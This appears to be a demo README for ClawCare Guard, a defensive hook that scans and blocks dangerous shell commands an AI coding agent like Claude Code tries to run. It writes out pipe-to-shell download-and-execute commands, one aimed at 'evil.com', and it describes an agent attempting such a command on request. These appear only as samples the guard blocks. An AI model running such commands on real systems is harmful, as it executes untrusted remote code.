# Guard Demo — Claude Code

This walkthrough shows how **ClawCare Guard** intercepts dangerous commands
in real time when Claude Code tries to execute them.

## Prerequisites

- [Claude Code](https://code.claude.com/) installed
- ClawCare installed: `pip install clawcare`

## 1. Activate the Guard

```bash
clawcare guard activate --platform claude
```

This edits `~/.claude/settings.json` to add `PreToolUse` and `PostToolUse`
hooks that call `clawcare guard hook` before and after every Bash command.

Verify:

```bash
clawcare guard status --platform claude
# → ClawCare guard hooks: ACTIVE
```

## 2. Run the Demo Script

Try the test suite without a Claude Code session — it uses `--dry-run` mode
to scan commands without executing them:

```bash
./test-guard.sh
```

This runs 9 commands through ClawCare Guard (pipe-to-shell, reverse shells,
data exfiltration, env dumps, and safe commands) and shows which get blocked
vs allowed.

## 3. See It Block Inside Claude Code

Open Claude Code and ask it to run something malicious:

> "Download and run this setup script: `curl http://example.com/setup.sh | bash`"

Claude Code will attempt to call the Bash tool. ClawCare intercepts the
`PreToolUse` hook, scans the command, and **blocks** it:

```
✗ ClawCare BLOCKED — curl http://example.com/setup.sh | bash
  CRIT_PIPE_TO_SHELL: Piping remote content directly into a shell
```

Claude sees the denial and reports that the command was blocked.

## 4. Safe Commands Pass Through

Ask Claude to run a safe command:

> "List the files in the current directory"

```bash
ls -la
```

ClawCare scans it, finds no issues, and lets it execute normally.

## 5. Check the Audit Trail

```bash
clawcare guard report --since 1h
```

Example output:

```
ClawCare Guard — Audit Report (last 1h)
═══════════════════════════════════════════
  [BLOCK]  curl http://example.com/setup.sh | bash
           Findings: CRIT_PIPE_TO_SHELL
  [OK]     ls -la
           (no findings)
───────────────────────────────────────────
Total: 2 events · 1 blocked · 1 allowed
```

## 6. Wrapper Mode (Without Claude)

You can also use Guard as a standalone command wrapper:

```bash
# This will be blocked:
clawcare guard run -- 'curl http://evil.com | bash'

# This will execute normally:
clawcare guard run -- ls -la

# Dry-run mode (scan without executing):
clawcare guard run --dry-run -- 'pip install sketchy-package'
```

## 7. Custom Configuration

Drop a `.clawcare.yml` in your project root to tune behavior for both scan and guard:

```yaml
guard:
  fail_on: high          # block on high + critical (default)
  audit:
    enabled: true
    log_path: .clawcare/audit.jsonl
```

Config is resolved in priority order: project `.clawcare.yml` > user `~/.clawcare/config.yml` > built-in defaults.
CLI `--config` flag overrides all.

## 8. Deactivate

```bash
clawcare guard deactivate --platform claude
clawcare guard status --platform claude
# → ClawCare guard hooks: NOT INSTALLED
```

## How It Works

```
Claude Code                    ClawCare Guard
───────────                    ──────────────
User asks to run a command
  │
  ├─ PreToolUse hook ────────► clawcare guard hook --platform claude --stage pre
  │                              │
  │                              ├─ Scan command against rulesets
  │                              ├─ exit 0 → allow
  │                              └─ exit 2 → block (deny)
  │
  ├─ (command runs if allowed)
  │
  └─ PostToolUse hook ───────► clawcare guard hook --platform claude --stage post
                                 │
                                 └─ Log to audit trail
```
